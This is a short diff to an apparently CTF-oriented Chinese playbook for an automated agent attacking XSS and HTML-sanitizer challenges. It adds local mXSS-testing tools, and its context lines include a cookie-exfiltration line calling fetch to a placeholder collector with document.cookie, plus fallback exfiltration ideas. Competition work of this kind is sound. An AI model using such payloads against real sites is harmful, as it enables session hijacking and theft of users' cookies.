@@ -27,6 +27,14 @@
 3. **外带通道**：`fetch('http://你的收集端/'+document.cookie)`——无收集端时，
    用目标自身（把 cookie 写进新文章标题再读列表）或请求时间侧信道
 
+## 本地 oracle（hunter 已装配 sanitize_oracle 插件时）
+
+净化器类题目**先本地差分，再远程验证**（author_plus 教训：远程盲测烧 200 步）：
+- `mxss_probe(attachments_dir, payload)`：题目自带 sanitize.js 双重净化 →
+  Chromium 解析 → 判定是否复活为可执行 markup（true = 命中 mXSS）
+- `sanitize_probe` / `browser_check`：分步版（先看净化输出，再单测浏览器解析）
+- 命中后仍需真实触发验证（起 bot/浏览器拿证据）才可 report_finding
+
 ## 纪律
 
 - **本地复现优先于盲测远程**（author_plus 教训：200 步耗在远程时序 oracle 上，
